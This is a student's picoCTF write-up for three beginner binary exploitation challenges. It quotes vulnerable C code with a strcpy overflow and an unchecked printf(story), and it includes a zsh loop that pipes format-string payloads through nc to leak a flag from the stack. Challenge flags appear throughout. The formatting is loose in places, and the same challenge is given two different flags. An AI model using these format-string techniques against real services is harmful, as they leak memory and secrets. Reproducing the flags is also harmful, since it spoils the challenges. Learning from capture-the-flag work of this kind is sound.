# Binary Exploitation


## Buffer Overflow 0



**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}`

We know it's a buffer overflow, so typing long stuff will get us the string

To know why, I read the code : 

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```


Concepts Learned : The `sigsegv_handler` function is called when a segmentation fault occurs. 
The ``strcpy`` can cause the sigsev (writing outta bounds). So we just input a string b/w (16,100) and make it overflow.

picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```


## Format String 0
By glancing the code, we can see that there are 
printfs() statements without format strings. The segfault is because of trying to parse non string bytes as bytes.
Putting in a large string and invoking the `sigsegv_handler` will give us the flag : `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}`

# Flag Leak
This One was an especially hard one for me. I read through the code 1st as always.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
There is A scanf OMG. I tried smashing the scanf in hopes of leaking the flag but that was going nowhere so I tried to attack the stack directly using a script.
```
zsh
for i in {1..30}; do echo %"$i"\$s | nc mimas.picoctf.net 55612

done
```
which gave me the flag 

```
satwik@Satwik:~$ zsh
Satwik% for i in {1..30}; do echo %"$i"\$s |nc saturn.picoctf.net 53938

After Looking through the bruteforce I found the flag : `CTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}` which I had to format to `picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}` to submit.

# Concepts Learned

Understanding that c and c++ are plagued with a lot of memory leakage problems which we can use to our benefits. One such usecase is remote code execution.
